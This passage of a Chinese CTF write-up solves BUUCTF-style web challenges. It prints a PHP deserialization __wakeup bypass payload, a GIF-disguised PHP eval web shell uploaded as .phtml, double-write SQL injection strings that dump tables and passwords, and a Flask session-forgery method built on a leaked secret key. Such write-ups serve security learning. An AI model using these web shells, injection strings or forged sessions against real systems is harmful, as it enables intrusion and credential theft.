include &amp;#39;class.php&amp;#39;;
$select = $_GET[&amp;#39;select&amp;#39;];
$res=unserialize(@$select);
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;再结合又一个class.php，所以这道题考点应该是反序列化。&lt;/p&gt;
&lt;p&gt;class.php&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include &amp;#39;flag.php&amp;#39;;
error_reporting(0);
class Name{
private $username = &amp;#39;nonono&amp;#39;;
private $password = &amp;#39;yesyes&amp;#39;;
public function __construct($username,$password){
$this-&amp;gt;username = $username;
$this-&amp;gt;password = $password;
}
function __wakeup(){
$this-&amp;gt;username = &amp;#39;guest&amp;#39;;
}
function __destruct(){
if ($this-&amp;gt;password != 100) {
echo &amp;#34;&amp;lt;/br&amp;gt;NO!!!hacker!!!&amp;lt;/br&amp;gt;&amp;#34;;
echo &amp;#34;You name is: &amp;#34;;
echo $this-&amp;gt;username;echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
echo &amp;#34;You password is: &amp;#34;;
echo $this-&amp;gt;password;echo &amp;#34;&amp;lt;/br&amp;gt;&amp;#34;;
die();
}
if ($this-&amp;gt;username === &amp;#39;admin&amp;#39;) {
global $flag;
echo $flag;
}else{
echo &amp;#34;&amp;lt;/br&amp;gt;hello my friend~~&amp;lt;/br&amp;gt;sorry i can&amp;#39;t give you the flag!&amp;#34;;
die();
}
}
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;获取flag的代码位置是30-32行。分析这个Name对象，创建对象时可以为对象赋值，对象销毁时会判断password值是否是100，且username值是否为admin，如果两者都成立输出flag，但是__wakeup（）会在反序列化时调用将username值置为guest，所以需要反序列化逃逸。这里面有反序列化讲解&lt;a class="link" href="https://www.cnblogs.com/zy-king-karl/p/11436872.html" target="_blank" rel="noopener"
&gt;CVE-2016-7124漏洞复现&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;我使用的构造对象&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
class Name{
private $username =&amp;#39;admin&amp;#39;;
private $password =&amp;#39;100&amp;#39;;
}
$a = new Name;
echo serialize($a);
O:4:&amp;#34;Name&amp;#34;:2:{s:14:&amp;#34;%00Name%00username&amp;#34;;s:5:&amp;#34;admin&amp;#34;;s:14:&amp;#34;%00Name%00password&amp;#34;;s:3:&amp;#34;100&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;反序列化逃逸，使对象属性的数量大于原来的值，就可以绕过wakeup函数。最终payload&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?select=O:4:&amp;#34;Name&amp;#34;:3:{s:14:&amp;#34;%00Name%00username&amp;#34;;s:5:&amp;#34;admin&amp;#34;;s:14:&amp;#34;%00Name%00password&amp;#34;;s:3:&amp;#34;100&amp;#34;;}
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="极客大挑战-2019upload"&gt;[极客大挑战 2019]Upload
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121111429.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;先尝试上传一个gif图片马内容为&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;页面提示过滤：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;NO! HACKER! your file included &amp;lsquo;&amp;lt;?&amp;rsquo;&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;尝试script执行php代码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;script language=&amp;#34;php&amp;#34;&amp;gt;eval($_POST[&amp;#39;cmd&amp;#39;])&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以上传，文件在/upload目录下。尝试修改后缀上传，phtml上传成功，可以执行php和script代码，使用蚁剑连接。&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210121112135.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h1 id="20210128"&gt;2021.01.28
&lt;/h1&gt;&lt;h1 id="极客大挑战-2019babysql"&gt;[极客大挑战 2019]BabySQL
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128113412.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;尝试万能密码，发现报错了：1=1#&amp;rsquo; and password=&amp;lsquo;123&amp;rsquo;，也许是or被过滤了或者删掉了，尝试大小写无果，但是尝试双写通过了。需要注意的是爆表，爆数据库的语句中有&lt;strong&gt;information&lt;/strong&gt;这个词，其中的&lt;strong&gt;for&lt;/strong&gt;也会被过滤。其他过滤的词我遇到的有：union，select、from、where、and。&lt;/p&gt;
&lt;p&gt;爆数据库（填密码）：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(table_name) frfromom infoorrmation_schema.tables whwhereere table_schema=database() #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆表：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(column_name) frfromom infoorrmation_schema.columns whwhereere table_schema=database() aandnd table_name=&amp;#39;b4bsql&amp;#39; #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;爆字段值：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;1&amp;#39; uniunionon selselectect 1,2,group_concat(id,username,passwoorrd) ffromrom b4bsql #
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-新生赛upload"&gt;[ACTF2020 新生赛]Upload
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210128114257.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;指针放在灯泡上护显示上传文件的，图片马&lt;/p&gt;
&lt;p&gt;233.gif&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;尝试phtml是否被过滤，直接上传成功。蚁剑连接&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;------WebKitFormBoundaryUMSByAQmR2cduL6R
Content-Disposition: form-data; name=&amp;#34;upload_file&amp;#34;; filename=&amp;#34;233.phtml&amp;#34;
Content-Type: image/gif
GIF89a
&amp;lt;?php
@eval($_POST[&amp;#39;a&amp;#39;]);
------WebKitFormBoundaryUMSByAQmR2cduL6R
Content-Disposition: form-data; name=&amp;#34;submit&amp;#34;
upload
------WebKitFormBoundaryUMSByAQmR2cduL6R--
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="actf2020-新生赛backupfile"&gt;[ACTF2020 新生赛]BackupFile
&lt;/h1&gt;&lt;pre tabindex="0"&gt;&lt;code&gt;Try to find out source file!
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;题目提示备份文件，备份文件常见后缀：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;.git .svn .swp .~ .bak .bash_history&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;尝试index.php.bak，下载了一个备份文件：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
include_once &amp;#34;flag.php&amp;#34;;
if(isset($_GET[&amp;#39;key&amp;#39;])) {
$key = $_GET[&amp;#39;key&amp;#39;];
if(!is_numeric($key)) {
exit(&amp;#34;Just num!&amp;#34;);
}
$key = intval($key);
$str = &amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;;
if($key == $str) {
echo $flag;
}
}
else {
echo &amp;#34;Try to find out source file!&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;传一个必须为数字的参数key，使用intval（）函数处理，字符串相等则输出flag。这就想到了PHP中的&lt;code&gt;==&lt;/code&gt;和&lt;code&gt;===&lt;/code&gt;的区别。贴一段简单代码&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;&amp;lt;?php
$str = &amp;#39;abc&amp;#39;;
if(0==$str){
echo &amp;#34;真&amp;#34;;
}else{
echo &amp;#34;假&amp;#34;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;==&lt;/code&gt;在执行关系运算时，要求运算符两边的数据类型必须一致，所以等号右边的字符串被强制转换为了整型，若有一方为数字，另一方为字符串或空或null，均会先将非数字一方转化为0，再做比较。如果字符串是以数字开头的，就会截取直到遇到第一个字母。&lt;/p&gt;
&lt;p&gt;全等于&lt;code&gt;===&lt;/code&gt;操作过程如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;操作符两边的数据类型如果不相同，返回false 。&lt;/li&gt;
&lt;li&gt;操作符两边的值如果不相同，返回false 。&lt;/li&gt;
&lt;li&gt;最后将上面2步的操作进行与操作。返回与操作的结果。&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以最终的payload：&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;?key=123
&lt;/code&gt;&lt;/pre&gt;&lt;hr&gt;
&lt;h1 id="hctf-2018admin"&gt;[HCTF 2018]admin
&lt;/h1&gt;&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202182820.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;可以在注释里找到&lt;/p&gt;
&lt;blockquote&gt;
&lt;/blockquote&gt;
&lt;p&gt;思路应该是只要我们是admin登陆就可以得到flag，可以找到注册按钮，不能注册admin,那就随便注册一个进去看看。找到几个功能。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;post。发表文章，但是没能找到在哪里打开&lt;/li&gt;
&lt;li&gt;change password。改密码，尝试下能不能抓包改到admin的密码&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;修改密码抓到的包：&lt;/p&gt;
&lt;p&gt;&lt;img src="https://cdn.jsdelivr.net/gh/penginman/PicBed@master/artical/20210202183647.png"
loading="lazy"
&gt;&lt;/p&gt;
&lt;p&gt;感觉并没有什么下手的地方，唯一的就是session可能和身份有关。&lt;/p&gt;
&lt;p&gt;以下的是看网上的wp&lt;/p&gt;
&lt;p&gt;在change password页面查看源码，发现提供了题目的源码地址&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-html" data-lang="html"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;&amp;lt;!-- https://github.com/woadsl1234/hctf_flask/ --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;网站使用的是flask框架，具体路由表如下&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/code&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#二维码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;get_code&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/index&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#首页&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;index&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/register&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#注册&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;register&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/login&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#登陆&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;login&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/logout&amp;#39;&lt;/span&gt;) &lt;span style="color:#75715e"&gt;#登出&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;logout&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/change&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#修改密码&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;change&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#a6e22e"&gt;@app.route&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;/edit&amp;#39;&lt;/span&gt;, methods &lt;span style="color:#f92672"&gt;=&lt;/span&gt; [&lt;span style="color:#e6db74"&gt;&amp;#39;GET&amp;#39;&lt;/span&gt;, &lt;span style="color:#e6db74"&gt;&amp;#39;POST&amp;#39;&lt;/span&gt;]) &lt;span style="color:#75715e"&gt;#编辑信息&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;edit&lt;/span&gt;():
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id="解法一flask-session伪造"&gt;解法一：flask session伪造
&lt;/h2&gt;&lt;p&gt;这个解法和前面查看请求头时发现的session有关，flask框架是通过session来判断登录的用户身份，但是这个session是通过一些字符串拼接后加密的，所以如果我们可以知道字符串和加密算法，就可以实现伪造session。&lt;/p&gt;
&lt;p&gt;贴两篇相关文章：&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://xz.aliyun.com/t/3569" target="_blank" rel="noopener"
&gt;Python Web之flask session&amp;amp;格式化字符串漏洞&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a class="link" href="https://www.leavesongs.com/PENETRATION/client-session-security.html#" target="_blank" rel="noopener"
&gt;客户端 session 导致的安全问题&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;首先需要注册一个账号登陆上去，看看请求头Cookie里的session值。&lt;/p&gt;
&lt;p&gt;说明一下flask的session值加密格式是：&lt;code&gt;SECRET_KEY&lt;/code&gt; +&lt;code&gt;一个用户对象的字符串&lt;/code&gt;(就像PHP里的序列化后)。&lt;code&gt;SECRET_KEY&lt;/code&gt;的值我们可以在源码里找到：https://github.com/woadsl1234/hctf_flask/blob/master/app/config.py中的第四行&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;SECRET_KEY = os.environ.get(&amp;#39;SECRET_KEY&amp;#39;) or &amp;#39;ckj123&amp;#39;
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以得知&lt;code&gt;SECRET_KEY&lt;/code&gt;值为&lt;code&gt;ckj123&lt;/code&gt;。然后在index.html页面发现只要session[‘name’] == &amp;lsquo;admin’即可以得到flag。接下来就要使用到一个解密工具，需要解密出用户字符串的格式，再将用户名改为admin，加密后再去请求，我们就可以以admin的身份登陆了。&lt;/p&gt;
&lt;p&gt;如下 &lt;a class="link" href="https://www.leavesongs.com/" target="_blank" rel="noopener"
&gt;&lt;strong&gt;P师傅&lt;/strong&gt;&lt;/a&gt; 的程序解密：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"&gt;&lt;code class="language-python" data-lang="python"&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#75715e"&gt;#!/usr/bin/env python3&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; sys
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;import&lt;/span&gt; zlib
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; base64 &lt;span style="color:#f92672"&gt;import&lt;/span&gt; b64decode
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; flask.sessions &lt;span style="color:#f92672"&gt;import&lt;/span&gt; session_json_serializer
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#f92672"&gt;from&lt;/span&gt; itsdangerous &lt;span style="color:#f92672"&gt;import&lt;/span&gt; base64_decode
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;def&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;decryption&lt;/span&gt;(payload):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload, sig &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;rsplit(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload, timestamp &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;rsplit(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;, &lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decompress &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;False&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; payload&lt;span style="color:#f92672"&gt;.&lt;/span&gt;startswith(&lt;span style="color:#e6db74"&gt;b&lt;/span&gt;&lt;span style="color:#e6db74"&gt;&amp;#39;.&amp;#39;&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; payload[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;:]
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; decompress &lt;span style="color:#f92672"&gt;=&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;True&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; base64_decode(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Could not base64 decode the payload because of &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;an exception&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; decompress:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;try&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; payload &lt;span style="color:#f92672"&gt;=&lt;/span&gt; zlib&lt;span style="color:#f92672"&gt;.&lt;/span&gt;decompress(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;except&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt; &lt;span style="color:#66d9ef"&gt;as&lt;/span&gt; e:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;raise&lt;/span&gt; &lt;span style="color:#a6e22e"&gt;Exception&lt;/span&gt;(&lt;span style="color:#e6db74"&gt;&amp;#39;Could not zlib decompress the payload before &amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;decoding the payload&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; &lt;span style="color:#66d9ef"&gt;return&lt;/span&gt; session_json_serializer&lt;span style="color:#f92672"&gt;.&lt;/span&gt;loads(payload)
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt;&lt;span style="color:#66d9ef"&gt;if&lt;/span&gt; __name__ &lt;span style="color:#f92672"&gt;==&lt;/span&gt; &lt;span style="color:#e6db74"&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style="display:flex;"&gt;&lt;span&gt; print(decryption(sys&lt;span style="color:#f92672"&gt;.&lt;/span&gt;argv[&lt;span style="color:#ae81ff"&gt;1&lt;/span&gt;]&lt;span style="color:#f92672"&gt;.&lt;/span&gt;encode()))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行命令&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;python run.py .eJw90MGKwkAMBuBXWXL2YLvuRfAgjBaFpFRGh8lFdK1tpxOFqmwd8d131gVvIX_4SPKA7bErLzWMr92tHMC2OcD4AR97GIPVOKIU-zzDgI4bDAeP2cZhWAcSO0SzcpiuhM26R1OMYi8h4faVSZGyniYYqk8y7FgdmlzFOV1LrufCat6gxpSikRu8WzMLrNqE1CJFXYzYRMmwZ-HahmXNGTkKi7sNbUpq6aP_xcpLrthbZyfwHMD3pTtur-e2PL1PyP_IUAWKS1uZ9Si2JzP3nLGg4NA6TMjYH9bexbonXXsuJi-ukV1VvqVi4xer6X9y2kkMoLqd97tTBQO4Xcru9TlIhvD8BSJwb7A.YELi9g.D_opOsSTFKn3wKeMF1rcGksx5HA
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;结果&lt;/p&gt;
&lt;pre tabindex="0"&gt;&lt;code&gt;{&amp;#39;_fresh&amp;#39;: True, &amp;#39;_id&amp;#39;: b&amp;#39;a387c18c326b37e0ec3536f41dc3dfee11d86f56fd6f42d6e053875fcd7b85118f91fd1b1365dc9c2aa3d95426148ecfefeffac2adcc722c9642e2d9d9f86eb6&amp;#39;, &amp;#39;csrf_token&amp;#39;: b&amp;#39;895783633ba12f15aedff2c4b355f0e9cb3158ee&amp;#39;, &amp;#39;image&amp;#39;: b&amp;#39;AYHD&amp;#39;, &amp;#39;name&amp;#39;: &amp;#39;guobang&amp;#39;, &amp;#39;user_id&amp;#39;: &amp;#39;10&amp;#39;}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;然后我们需要吧&lt;code&gt;name&lt;/code&gt;的值修改为&lt;code&gt;admin&lt;/code&gt;。修改完成以后还需要回到原来的session格式，那么就需要用到一个加密flask的工具：&lt;a class="link" href="https://github.com/noraj/flask-session-cookie-manager" target="_blank" rel="noopener"
&gt;flask-session-cookie-manager&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这个工具也可以用来解密。我整理的使用方法如下，记得要用双引号&lt;code&gt;&amp;quot;&amp;quot;&lt;/code&gt;括起来&lt;/p&gt;
&lt;p&gt;python flask_session_cookie_manager{2,3}.py {encode,decode}&lt;/p&gt;
&lt;p&gt;-s &amp;ldquo;SECRET_KEY&amp;rdquo; 都需要使用
-c &amp;ldquo;Session cookie value&amp;rdquo; session的值 只有解密decode用得到
-t &amp;ldquo;Session cookie structure&amp;rdquo; cookie结构 只有encode用得&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;执行&lt;/p&gt;
